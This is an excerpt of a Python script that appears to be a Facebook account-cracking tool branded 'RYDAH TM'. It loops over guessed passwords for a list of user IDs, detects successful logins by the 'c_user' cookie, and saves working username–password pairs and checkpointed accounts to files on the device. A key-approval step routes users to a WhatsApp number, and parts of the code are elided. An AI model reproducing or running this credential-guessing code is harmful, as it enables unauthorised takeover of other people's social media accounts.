...
def main_apv():
    ...
    try:
        ...
        print ("")
        print ("")
        print ("     Copy Key And Send Me WhatsApp for Approval Your Key ")
        print ("[*]--------------------------------------------------------------")
        time.sleep(6)
        os.system("xdg-open https://wa.me/+2349017624430")
        
    r1=requests.get("https://github.com/Rydah300/NewRydah/blob/main/token.txt").text
    if key1 in r1:
        R()
    else:
        os.system("clear")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ RYDAH TM 😘] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[RYDAH-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/RYDAH TM_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/RYDAH TM_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[RYDAH-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
		...
		loop += 1
	def __pler__(self):
		print ("\033[1;94m [1] Auto 2 Pass ([ S U P E R F A S T ] ")
...
\x1b[1;97m------------------------\x1b[1;97m------------------------×
\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97m          RYDAH TM
\033[1;91m[!]\033[1;97m Whatsapp\x1b[1;97m:  \x1b[1;97m          +2349017624430
\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97m           RYDAH TM
